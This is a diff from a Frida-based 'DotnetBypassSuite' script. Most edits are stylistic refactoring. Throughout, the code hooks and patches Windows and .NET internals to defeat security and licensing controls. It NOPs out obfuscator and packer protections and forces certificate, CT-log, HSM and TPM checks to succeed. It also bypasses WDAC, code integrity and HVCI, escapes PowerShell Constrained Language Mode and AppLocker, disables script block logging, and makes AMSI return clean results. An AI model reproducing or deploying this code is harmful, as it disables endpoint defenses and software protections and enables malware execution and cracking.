-            '48 8D 8C 24 ?? ?? ?? ?? E8 ?? ?? ?? ?? 85 C0 0F 84',
-        ];
+      const dnguardPatterns = [
+        'DNGuard',
+        'HVM',
+        'DNG_',
+        '48 8D 8C 24 ?? ?? ?? ?? E8 ?? ?? ?? ?? 85 C0 0F 84',
+      ];
 
-        dnguardPatterns.forEach(function (pattern) {
-            var matches = Memory.scanSync(self.clrModule.base, self.clrModule.size, pattern);
-            matches.forEach(function (match) {
+      dnguardPatterns.forEach(pattern => {
+          const matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, pattern);
+          matches.forEach(match => {
                 Interceptor.attach(match.address, {
-                    onEnter: function (args) {
+                    onEnter: _args => {
                         send({
                             type: 'bypass',
                             target: 'dotnet_bypass_suite',
@@ -1956,30 +1914,30 @@ const DotnetBypassSuite = {
                             address: match.address.toString(),
                         });
                     },
-                    onLeave: function (retval) {
+                    onLeave: retval => {
                         // Bypass DNGuard HVM protection
                         retval.replace(1);
-                        self.stats.modernObfuscatorSupportEvents++;
+                        this.stats.modernObfuscatorSupportEvents++;
                     },
                 });
             });
         });
 
         // .NET Reactor v6 patterns
-        var reactorV6Patterns = [
-            '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57 48 81 EC',
-            'Reactor',
-            'NETReactor',
-            'NecroBit',
-        ];
+      const reactorV6Patterns = [
+        '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57 48 81 EC',
+        'Reactor',
+        'NETReactor',
+        'NecroBit',
+      ];
 
-        reactorV6Patterns.forEach(function (pattern) {
-            var matches = Memory.scanSync(self.clrModule.base, self.clrModule.size, pattern);
-            matches.forEach(function (match) {
+      reactorV6Patterns.forEach(pattern => {
+          const matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, pattern);
+          matches.forEach(match => {
                 // Patch .NET Reactor v6 protection
-                Memory.patchCode(match.address, 16, function (code) {
+                Memory.patchCode(match.address, 16, code => {
                     // NOP out protection code
-                    for (var i = 0; i < 16; i++) {
+                    for (let i = 0; i < 16; i++) {
                         code.putU8(0x90);
                     }
                 });
@@ -1989,26 +1947,26 @@ const DotnetBypassSuite = {
                     action: 'net_reactor_v6_patched',
                     address: match.address.toString(),
                 });
-                self.stats.modernObfuscatorSupportEvents++;
+                this.stats.modernObfuscatorSupportEvents++;
             });
         });
 
         // Themida .NET patterns
-        var themidaNetPatterns = [
-            'Themida',
-            'WinLicense',
-            '48 8B C4 48 89 58 ?? 48 89 68 ?? 48 89 70 ?? 48 89 78 ?? 41 54 41 55 41 56 41 57 48 83 EC',
-        ];
+      const themidaNetPatterns = [
+        'Themida',
+        'WinLicense',
+        '48 8B C4 48 89 58 ?? 48 89 68 ?? 48 89 70 ?? 48 89 78 ?? 41 54 41 55 41 56 41 57 48 83 EC',
+      ];
 
-        themidaNetPatterns.forEach(function (pattern) {
-            var matches = Memory.scanSync(
-                Module.getBaseAddress('kernel32.dll'),
-                Module.getSize('kernel32.dll'),
-                pattern
-            );
-            matches.forEach(function (match) {
+      themidaNetPatterns.forEach(pattern => {
+          const matches = Memory.scanSync(
+            Module.getBaseAddress('kernel32.dll'),
+            Module.getSize('kernel32.dll'),
+            pattern
+          );
+          matches.forEach(match => {
                 Interceptor.attach(match.address, {
-                    onEnter: function (args) {
+                    onEnter: _args => {
                         send({
                             type: 'bypass',
                             target: 'dotnet_bypass_suite',
@@ -2016,11 +1974,11 @@ const DotnetBypassSuite = {
                             address: match.address.toString(),
                         });
                     },
-                    onLeave: function (retval) {
+                    onLeave: retval => {
                         // Bypass Themida .NET protection
                         if (retval.toInt32() === 0) {
                             retval.replace(1);
-                            self.stats.modernObfuscatorSupportEvents++;
+                            this.stats.modernObfuscatorSupportEvents++;
                         }
                     },
                 });
@@ -2028,12 +1986,12 @@ const DotnetBypassSuite = {
         });
 
         // Hook modern control flow obfuscation
-        var cfoPattern = '48 8D 05 ?? ?? ?? ?? 48 8B 0C ?? 48 FF E1';
-        var cfoMatches = Memory.scanSync(self.clrModule.base, self.clrModule.size, cfoPattern);
+      const cfoPattern = '48 8D 05 ?? ?? ?? ?? 48 8B 0C ?? 48 FF E1';
+      const cfoMatches = Memory.scanSync(this.clrModule.base, this.clrModule.size, cfoPattern);
 
-        cfoMatches.forEach(function (match) {
+      cfoMatches.forEach(match => {
             // Deobfuscate control flow
-            Memory.patchCode(match.address, 8, function (code) {
+            Memory.patchCode(match.address, 8, code => {
                 code.putU8(0x48);
                 code.putU8(0xc7);
                 code.putU8(0xc0); // mov rax, immediate
@@ -2049,7 +2007,7 @@ const DotnetBypassSuite = {
                 action: 'control_flow_obfuscation_deobfuscated',
                 address: match.address.toString(),
             });
-            self.stats.modernObfuscatorSupportEvents++;
+            this.stats.modernObfuscatorSupportEvents++;
         });
 
         this.stats.methodsHooked +=
@@ -2061,26 +2019,24 @@ const DotnetBypassSuite = {
 
     // 7. Certificate Transparency Log Bypass for .NET Code Signing
     hookCertificateTransparencyLogDotNetBypass: function () {
-        var self = this;
-
         // Hook certificate validation with CT log verification
-        var ctLogPatterns = [
-            '48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B FA 48 8B F1 48 8B 0D',
-            '41 56 48 83 EC ?? 4C 8B F2 48 8B D1 48 8D 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 85 C0',
-        ];
+      const ctLogPatterns = [
+        '48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B FA 48 8B F1 48 8B 0D',
+        '41 56 48 83 EC ?? 4C 8B F2 48 8B D1 48 8D 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 85 C0',
+      ];
 
-        ctLogPatterns.forEach(function (pattern) {
-            var matches = Memory.scanSync(
-                Module.getBaseAddress('crypt32.dll'),
-                Module.getSize('crypt32.dll'),
-                pattern
-            );
+      ctLogPatterns.forEach(pattern => {
+          const matches = Memory.scanSync(
+            Module.getBaseAddress('crypt32.dll'),
+            Module.getSize('crypt32.dll'),
+            pattern
+          );
 
-            matches.forEach(function (match) {
+          matches.forEach(match => {
                 Interceptor.attach(match.address, {
-                    onEnter: function (args) {
-                        var certContext = args[0];
-                        if (certContext && !certContext.isNull()) {
+                    onEnter: args => {
+                      const certContext = args[0];
+                      if (certContext && !certContext.isNull()) {
                             send({
                                 type: 'info',
                                 target: 'dotnet_bypass_suite',
@@ -2088,11 +2044,11 @@ const DotnetBypassSuite = {
                             });
                         }
                     },
-                    onLeave: function (retval) {
+                    onLeave: retval => {
                         // Bypass CT log verification
                         if (retval.toInt32() === 0) {
                             retval.replace(1);
-                            self.stats.certificateTransparencyLogDotNetBypassEvents++;
+                            this.stats.certificateTransparencyLogDotNetBypassEvents++;
                             send({
                                 type: 'bypass',
                                 target: 'dotnet_bypass_suite',
@@ -2105,28 +2061,28 @@ const DotnetBypassSuite = {
         });
 
         // Hook .NET specific certificate chain validation with CT
-        var dotNetCertPattern =
-            '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57 48 83 EC ?? 4D 8B E1';
-        var dotNetMatches = Memory.scanSync(
-            self.clrModule.base,
-            self.clrModule.size,
-            dotNetCertPattern
-        );
+      const dotNetCertPattern =
+        '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57 48 83 EC ?? 4D 8B E1';
+      const dotNetMatches = Memory.scanSync(
+        this.clrModule.base,
+        this.clrModule.size,
+        dotNetCertPattern
+      );
 
-        dotNetMatches.forEach(function (match) {
+      dotNetMatches.forEach(match => {
             Interceptor.attach(match.address, {
-                onEnter: function (args) {
+                onEnter: _args => {
                     send({
                         type: 'info',
                         target: 'dotnet_bypass_suite',
                         action: 'dotnet_certificate_chain_validation_detected',
                     });
                 },
-                onLeave: function (retval) {
+                onLeave: retval => {
                     // Force certificate validation to succeed
                     if (retval.toInt32() !== 0) {
                         retval.replace(0);
-                        self.stats.certificateTransparencyLogDotNetBypassEvents++;
+                        this.stats.certificateTransparencyLogDotNetBypassEvents++;
                         send({
                             type: 'bypass',
                             target: 'dotnet_bypass_suite',
@@ -2142,27 +2098,25 @@ const DotnetBypassSuite = {
 
     // 8. Hardware Security Module (HSM) Certificate Bypass
     hookHsmCertificateBypass: function () {
-        var self = this;
-
         // Hook PKCS#11 interface for HSM communication
-        var pkcs11Pattern = 'C_GetSlotList';
-        try {
-            var pkcs11Func = Module.findExportByName(null, pkcs11Pattern);
-            if (pkcs11Func) {
+      const pkcs11Pattern = 'C_GetSlotList';
+      try {
+          const pkcs11Func = Module.findExportByName(null, pkcs11Pattern);
+          if (pkcs11Func) {
                 Interceptor.attach(pkcs11Func, {
-                    onEnter: function (args) {
-                        var tokenPresent = args[0].toInt32();
-                        send({
+                    onEnter: args => {
+                      const tokenPresent = args[0].toInt32();
+                      send({
                             type: 'info',
                             target: 'dotnet_bypass_suite',
                             action: 'hsm_pkcs11_get_slot_list_detected',
                             token_present: tokenPresent,
                         });
                     },
-                    onLeave: function (retval) {
+                    onLeave: retval => {
                         // Force HSM slot enumeration to succeed
                         retval.replace(0); // CKR_OK
-                        self.stats.hsmCertificateBypassEvents++;
+                        this.stats.hsmCertificateBypassEvents++;
                         send({
                             type: 'bypass',
                             target: 'dotnet_bypass_suite',
@@ -2184,25 +2138,25 @@ const DotnetBypassSuite = {
         }
 
         // Hook HSM certificate verification
-        var hsmVerifyPattern = 'C_Verify';
-        try {
-            var hsmVerify = Module.findExportByName(null, hsmVerifyPattern);
-            if (hsmVerify) {
+      const hsmVerifyPattern = 'C_Verify';
+      try {
+          const hsmVerify = Module.findExportByName(null, hsmVerifyPattern);
+          if (hsmVerify) {
                 Interceptor.attach(hsmVerify, {
-                    onEnter: function (args) {
-                        var session = args[0];
-                        var signature = args[1];
-                        send({
+                    onEnter: args => {
+                      const session = args[0];
+                      const _signature = args[1];
+                      send({
                             type: 'info',
                             target: 'dotnet_bypass_suite',
                             action: 'hsm_certificate_verification_detected',
                             session: session.toString(16),
                         });
                     },
-                    onLeave: function (retval) {
+                    onLeave: retval => {
                         // Force HSM signature verification to succeed
                         retval.replace(0); // CKR_OK
-                        self.stats.hsmCertificateBypassEvents++;
+                        this.stats.hsmCertificateBypassEvents++;
                         send({
                             type: 'bypass',
                             target: 'dotnet_bypass_suite',
@@ -2224,16 +2178,16 @@ const DotnetBypassSuite = {
         }
 
         // Hook Windows CNG HSM provider
-        var cngHsmPattern = 'NCryptOpenKey';
-        var cngHsm = Module.findExportByName('ncrypt.dll', cngHsmPattern);
-        if (cngHsm) {
+      const cngHsmPattern = 'NCryptOpenKey';
+      const cngHsm = Module.findExportByName('ncrypt.dll', cngHsmPattern);
+      if (cngHsm) {
             Interceptor.attach(cngHsm, {
-                onEnter: function (args) {
-                    var provider = args[0];
-                    var keyName = args[1];
-                    if (keyName && !keyName.isNull()) {
-                        var name = keyName.readUtf16String();
-                        send({
+                onEnter: args => {
+                  const _provider = args[0];
+                  const keyName = args[1];
+                  if (keyName && !keyName.isNull()) {
+                      const name = keyName.readUtf16String();
+                      send({
                             type: 'info',
                             target: 'dotnet_bypass_suite',
                             action: 'cng_hsm_key_access_detected',
@@ -2241,11 +2195,11 @@ const DotnetBypassSuite = {
                         });
                     }
                 },
-                onLeave: function (retval) {
+                onLeave: retval => {
                     // Allow HSM key access
                     if (retval.toInt32() !== 0) {
                         retval.replace(0);
-                        self.stats.hsmCertificateBypassEvents++;
+                        this.stats.hsmCertificateBypassEvents++;
                         send({
                             type: 'bypass',
                             target: 'dotnet_bypass_suite',
@@ -2258,22 +2212,22 @@ const DotnetBypassSuite = {
         }
 
         // Hook TPM-based certificate storage
-        var tpmPattern = 'Tbsi_GetDeviceInfo';
-        var tpm = Module.findExportByName('tbs.dll', tpmPattern);
-        if (tpm) {
+      const tpmPattern = 'Tbsi_GetDeviceInfo';
+      const tpm = Module.findExportByName('tbs.dll', tpmPattern);
+      if (tpm) {
             Interceptor.attach(tpm, {
-                onEnter: function (args) {
+                onEnter: _args => {
                     send({
                         type: 'info',
                         target: 'dotnet_bypass_suite',
                         action: 'tpm_certificate_access_detected',
                     });
                 },
-                onLeave: function (retval) {
+                onLeave: retval => {
                     // Allow TPM certificate access
                     if (retval.toInt32() !== 0) {
                         retval.replace(0);
-                        self.stats.hsmCertificateBypassEvents++;
+                        this.stats.hsmCertificateBypassEvents++;
                         send({
                             type: 'bypass',
                             target: 'dotnet_bypass_suite',
@@ -2288,26 +2242,24 @@ const DotnetBypassSuite = {
 
     // 9. Windows Defender Application Control (WDAC) Bypass
     hookWindowsDefenderApplicationControlBypass: function () {
-        var self = this;
-
         // Hook WDAC policy enforcement
-        var wdacPatterns = [
-            '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57 48 83 EC ?? 45 33 FF',
-            '41 56 48 83 EC ?? 4C 8B F2 48 8B D1 48 8D 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 85 C0 0F 85',
-        ];
+      const wdacPatterns = [
+        '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57 48 83 EC ?? 45 33 FF',
+        '41 56 48 83 EC ?? 4C 8B F2 48 8B D1 48 8D 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 85 C0 0F 85',
+      ];
 
-        wdacPatterns.forEach(function (pattern) {
-            var matches = Memory.scanSync(
-                Module.getBaseAddress('ci.dll'),
-                Module.getSize('ci.dll'),
-                pattern
-            );
+      wdacPatterns.forEach(pattern => {
+          const matches = Memory.scanSync(
+            Module.getBaseAddress('ci.dll'),
+            Module.getSize('ci.dll'),
+            pattern
+          );
 
-            matches.forEach(function (match) {
+          matches.forEach(match => {
                 Interceptor.attach(match.address, {
-                    onEnter: function (args) {
-                        var policyPtr = args[0];
-                        if (policyPtr && !policyPtr.isNull()) {
+                    onEnter: args => {
+                      const policyPtr = args[0];
+                      if (policyPtr && !policyPtr.isNull()) {
                             send({
                                 type: 'info',
                                 target: 'dotnet_bypass_suite',
@@ -2315,11 +2267,11 @@ const DotnetBypassSuite = {
                             });
                         }
                     },
-                    onLeave: function (retval) {
+                    onLeave: retval => {
                         // Bypass WDAC policy enforcement
                         if (retval.toInt32() !== 0) {
                             retval.replace(0);
-                            self.stats.windowsDefenderApplicationControlBypassEvents++;
+                            this.stats.windowsDefenderApplicationControlBypassEvents++;
                             send({
                                 type: 'bypass',
                                 target: 'dotnet_bypass_suite',
@@ -2332,16 +2284,16 @@ const DotnetBypassSuite = {
         });
 
         // Hook WDAC code integrity checks
-        var ciCheckPattern = 'CiCheckSignedFile';
-        var ciCheck = Module.findExportByName('ci.dll', ciCheckPattern);
-        if (ciCheck) {
+      const ciCheckPattern = 'CiCheckSignedFile';
+      const ciCheck = Module.findExportByName('ci.dll', ciCheckPattern);
+      if (ciCheck) {
             Interceptor.attach(ciCheck, {
-                onEnter: function (args) {
-                    var fileHandle = args[0];
-                    var fileName = args[1];
-                    if (fileName && !fileName.isNull()) {
-                        var name = fileName.readUtf16String();
-                        send({
+                onEnter: args => {
+                  const _fileHandle = args[0];
+                  const fileName = args[1];
+                  if (fileName && !fileName.isNull()) {
+                      const name = fileName.readUtf16String();
+                      send({
                             type: 'info',
                             target: 'dotnet_bypass_suite',
                             action: 'wdac_code_integrity_check_detected',
@@ -2349,11 +2301,11 @@ const DotnetBypassSuite = {
                         });
                     }
                 },
-                onLeave: function (retval) {
+                onLeave: retval => {
                     // Force code integrity check to pass
                     if (retval.toInt32() !== 0) {
                         retval.replace(0);
-                        self.stats.windowsDefenderApplicationControlBypassEvents++;
+                        this.stats.windowsDefenderApplicationControlBypassEvents++;
                         send({
                             type: 'bypass',
                             target: 'dotnet_bypass_suite',
@@ -2366,22 +2318,22 @@ const DotnetBypassSuite = {
         }
 
         // Hook HVCI (Hypervisor-protected Code Integrity)
-        var hvciPattern = 'HvciSetInternalProperties';
-        var hvci = Module.findExportByName('ntoskrnl.exe', hvciPattern);
-        if (hvci) {
+      const hvciPattern = 'HvciSetInternalProperties';
+      const hvci = Module.findExportByName('ntoskrnl.exe', hvciPattern);
+      if (hvci) {
             Interceptor.attach(hvci, {
-                onEnter: function (args) {
+                onEnter: _args => {
                     send({
                         type: 'info',
                         target: 'dotnet_bypass_suite',
                         action: 'hvci_enforcement_detected',
                     });
                 },
-                onLeave: function (retval) {
+                onLeave: retval => {
                     // Bypass HVCI enforcement
                     if (retval.toInt32() !== 0) {
                         retval.replace(0);
-                        self.stats.windowsDefenderApplicationControlBypassEvents++;
+                        this.stats.windowsDefenderApplicationControlBypassEvents++;
                         send({
                             type: 'bypass',
                             target: 'dotnet_bypass_suite',
@@ -2398,36 +2350,34 @@ const DotnetBypassSuite = {
 
     // 10. AppLocker .NET Script Enforcement Bypass
     hookAppLockerDotNetScriptEnforcementBypass: function () {
-        var self = this;
-
         // Hook PowerShell Constrained Language Mode enforcement
-        var clmPatterns = [
-            'System.Management.Automation.LanguageMode',
-            'ConstrainedLanguage',
-            '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57 48 81 EC',
-        ];
+      const clmPatterns = [
+        'System.Management.Automation.LanguageMode',
+        'ConstrainedLanguage',
+        '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57 48 81 EC',
+      ];
 
-        clmPatterns.forEach(function (pattern) {
-            var matches = Memory.scanSync(
-                Module.getBaseAddress('System.Management.Automation.dll'),
-                Module.getSize('System.Management.Automation.dll'),
-                pattern
-            );
+      clmPatterns.forEach(pattern => {
+          const matches = Memory.scanSync(
+            Module.getBaseAddress('System.Management.Automation.dll'),
+            Module.getSize('System.Management.Automation.dll'),
+            pattern
+          );
 
-            matches.forEach(function (match) {
+          matches.forEach(match => {
                 Interceptor.attach(match.address, {
-                    onEnter: function (args) {
+                    onEnter: _args => {
                         send({
                             type: 'info',
                             target: 'dotnet_bypass_suite',
                             action: 'powershell_clm_enforcement_detected',
                         });
                     },
-                    onLeave: function (retval) {
+                    onLeave: retval => {
                         // Set to FullLanguage mode
                         if (retval.toInt32() !== 0) {
                             retval.replace(0); // FullLanguage
-                            self.stats.appLockerDotNetScriptEnforcementBypassEvents++;
+                            this.stats.appLockerDotNetScriptEnforcementBypassEvents++;
                             send({
                                 type: 'bypass',
                                 target: 'dotnet_bypass_suite',
@@ -2440,25 +2390,25 @@ const DotnetBypassSuite = {
         });
 
         // Hook AppLocker .NET assembly restrictions
-        var applockerPatterns = [
-            '48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B F2 48 8B F9 48 8B 0D',
-            '41 57 48 83 EC ?? 4C 8B F9 48 8B D1 48 8D 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 85 C0',
-        ];
+      const applockerPatterns = [
+        '48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B F2 48 8B F9 48 8B 0D',
+        '41 57 48 83 EC ?? 4C 8B F9 48 8B D1 48 8D 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 85 C0',
+      ];
 
-        applockerPatterns.forEach(function (pattern) {
-            var matches = Memory.scanSync(
-                Module.getBaseAddress('appid.dll'),
-                Module.getSize('appid.dll'),
-                pattern
-            );
+      applockerPatterns.forEach(pattern => {
+          const matches = Memory.scanSync(
+            Module.getBaseAddress('appid.dll'),
+            Module.getSize('appid.dll'),
+            pattern
+          );
 
-            matches.forEach(function (match) {
+          matches.forEach(match => {
                 Interceptor.attach(match.address, {
-                    onEnter: function (args) {
-                        var assemblyPath = args[1];
-                        if (assemblyPath && !assemblyPath.isNull()) {
-                            var path = assemblyPath.readUtf16String();
-                            send({
+                    onEnter: args => {
+                      const assemblyPath = args[1];
+                      if (assemblyPath && !assemblyPath.isNull()) {
+                          const path = assemblyPath.readUtf16String();
+                          send({
                                 type: 'info',
                                 target: 'dotnet_bypass_suite',
                                 action: 'applocker_dotnet_restriction_detected',
@@ -2466,11 +2416,11 @@ const DotnetBypassSuite = {
                             });
                         }
                     },
-                    onLeave: function (retval) {
+                    onLeave: retval => {
                         // Allow .NET assembly execution
                         if (retval.toInt32() !== 0) {
                             retval.replace(0);
-                            self.stats.appLockerDotNetScriptEnforcementBypassEvents++;
+                            this.stats.appLockerDotNetScriptEnforcementBypassEvents++;
                             send({
                                 type: 'bypass',
                                 target: 'dotnet_bypass_suite',
@@ -2483,17 +2433,17 @@ const DotnetBypassSuite = {
         });
 
         // Hook Script Block Logging bypass
-        var sblPattern = 'ScriptBlockLogging';
-        try {
-            var sblMatches = Memory.scanSync(
-                Module.getBaseAddress('System.Management.Automation.dll'),
-                Module.getSize('System.Management.Automation.dll'),
-                sblPattern
-            );
+      const sblPattern = 'ScriptBlockLogging';
+      try {
+          const sblMatches = Memory.scanSync(
+            Module.getBaseAddress('System.Management.Automation.dll'),
+            Module.getSize('System.Management.Automation.dll'),
+            sblPattern
+          );
 
-            sblMatches.forEach(function (match) {
+          sblMatches.forEach(match => {
                 // Disable script block logging
-                Memory.patchCode(match.address, 4, function (code) {
+                Memory.patchCode(match.address, 4, code => {
                     code.putU8(0x48);
                     code.putU8(0x31);
                     code.putU8(0xc0); // xor rax, rax
@@ -2505,7 +2455,7 @@ const DotnetBypassSuite = {
                     action: 'script_block_logging_disabled',
                     address: match.address.toString(),
                 });
-                self.stats.appLockerDotNetScriptEnforcementBypassEvents++;
+                this.stats.appLockerDotNetScriptEnforcementBypassEvents++;
             });
         } catch (e) {
             send({
@@ -2519,16 +2469,16 @@ const DotnetBypassSuite = {
         }
 
         // Hook AMSI (Antimalware Scan Interface) for .NET scripts
-        var amsiPattern = 'AmsiScanBuffer';
-        var amsi = Module.findExportByName('amsi.dll', amsiPattern);
-        if (amsi) {
+      const amsiPattern = 'AmsiScanBuffer';
+      const amsi = Module.findExportByName('amsi.dll', amsiPattern);
+      if (amsi) {
             Interceptor.replace(
                 amsi,
                 new NativeCallback(
-                    function (context, buffer, length, contentName, session, result) {
+                    (_context, _buffer, _length, _contentName, _session, result) => {
                         // Return clean scan result
                         result.writeU32(1); // AMSI_RESULT_CLEAN
-                        self.stats.appLockerDotNetScriptEnforcementBypassEvents++;
+                        this.stats.appLockerDotNetScriptEnforcementBypassEvents++;
                         send({
                             type: 'bypass',
                             target: 'dotnet_bypass_suite',
